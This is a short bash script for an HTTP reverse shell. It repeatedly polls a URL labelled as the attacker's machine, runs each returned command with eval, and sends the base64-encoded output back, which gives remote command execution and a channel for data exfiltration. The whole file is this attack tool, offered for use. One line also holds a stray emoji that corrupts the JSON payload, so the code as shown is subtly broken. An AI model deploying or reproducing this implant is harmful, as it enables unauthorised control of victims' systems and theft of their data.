#!/bin/bash

url="http://192.168.1.18:80/" #Change this to your attacker machine IP 
data='{"data": "Q29ubmVjdGlvbiBSZWNlaXZlZAo="}'

while true; do
    command=$(curl -X POST -s -H "Content-Type: application/json" -d "$data" "$url")
    echo "response : $command"
    output=$(eval "$command" | base64)
    output2=$(echo "$output" | tr -cd '[:alnum:]/+=')
    data="{\"data\"😕"$output2\"}"

done